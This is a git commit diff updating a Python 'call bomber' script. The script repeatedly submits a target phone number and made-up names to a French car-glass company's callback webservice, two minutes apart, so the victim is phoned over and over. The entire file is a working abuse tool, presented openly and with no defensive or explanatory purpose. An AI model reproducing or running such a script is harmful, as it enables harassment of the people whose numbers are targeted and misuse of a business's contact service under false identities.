ea7afc8947178596e993ec00c5056731dc466fe2
Clément <44845040+ky0ox@users.noreply.github.com>
2019-11-23 19:28:54 +0100

    Add files via upload

--- callbomber_mobile.py
+++ callbomber_mobile.py
@@ -1,14 +1,11 @@
 import requests
 from time import sleep
-i = 0
-name = list()
-surname = list()
-name = ['Guillaume','Alexandre','Clement','Jean','Ibrahim','Kevin','Benoît','Geoffrey','Nicolas','Tom','Jules','William','Curtis']
-surname = ['Leclair', 'LeRoy','Pirouet','Moreau','Fournier','Goulet','Cobain','Gaulin','Bellefeuille','Dupuy','Larocque','St-Jacques']
-number = open('phonenumber.txt','r')
+name = open('name.ini','r')
+sur_name = open('surname.ini','r')
+number = open('phonenumber.ini','r')
 phonenumber = number.read()
-while i < len(name) & len(surname):
-	r = requests.get("https://www.carglass.fr/webservice/contact?name="+name[i]+"&surname="+surname[i]+"&e164="+phonenumber+"&delay=0&reason=NBOL&csrf_token=true")
-	print("Calling"+phonenumber+"...")
-	i+=1
+for line in name:
+	surname = sur_name.readline()
+	r = requests.get("https://www.carglass.fr/webservice/contact?name="+line+"&surname=&e164="+phonenumber+"&delay=0&reason=NBOL&csrf_token=true")
+	print("Calling "+phonenumber+"...")
 	sleep(120)
